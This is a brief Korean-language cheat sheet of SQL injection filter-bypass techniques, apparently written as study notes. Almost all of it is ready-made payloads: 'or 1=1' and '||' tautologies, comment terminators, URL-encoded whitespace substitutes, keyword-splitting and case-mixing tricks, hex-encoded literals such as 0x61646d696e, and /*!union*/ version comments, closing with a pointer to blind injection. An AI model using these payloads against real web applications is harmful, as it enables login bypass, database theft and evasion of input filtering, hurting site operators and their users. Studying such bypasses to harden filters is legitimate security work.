# SQL injection

### Filter Bypass(필터링 우회)

OR/AND     
->  ||/&&   
ex) select * from table where id='admin' or 1=1   
->  select * from table where id='admin' || 1=1   
ex) select * from table where id='admin' and pw='password'   
->  select * from table where id='admin' && pw='password'  
그 외 ^,=,!=,%,/,*,&,&&,|,||,>,<,XOR,DIV,LIKE,RLIKE,REGEXP,IS,IN,NOT,MATCH,AND,OR,BETWEEN,ISNULL   

주석   
->  -- # ;%00 -- - %23 /**/   
-- 주석 뒤에 공백문자가 있어야 된다.  
-- - 주석   
%23는 #을 의미한다.  
/*  주석할 내용  */   

=   
->  like in   
ex) select * from table where id='admin'  
->  select * from table where id like 'admin'   
->  select * from table where id in('admin')   

공백문자   
* tab : %09
* line feed(\n) : %0a
* carrage return(\r) : %0d
* 주석 : /**/
* 괄호 : ()
* 더하기 : +  
* back quote : \`
* vertical tab(\v) : %0b
* form feed(\f) : %0c
ex) id='admin' or 1=1   
->  id='admin'%09or%091=1   
->  id='admin'%0aor%0a1=1   
->  id='admin'%0dor%0d1=1   
->  id='admin'/\*\*/or/\*\*/1=1   
->  id=(admin)or(1=1)   
->  id="admin"+or+1=1   

특정 문자열    
replace   
replace("admin","",$in) 일 때   
adadminmin으로 우회 가능   
+을 사용해서 우회   
ad+min우회   
대소문자를 이용하여 우회   
aDmIn으로 우회   
reverse   
id=reverse('nimda')   
concat   
id=concat('adm','in')   
16진수   
id=x'61646d696e'   
id=0x61646d696e   
/\*! \*/   
/\*!union\*/   
where 필터링 join on으로 우회   
union,select 등이 필터링 되었을 땐 blind sql로 넘어간다.   
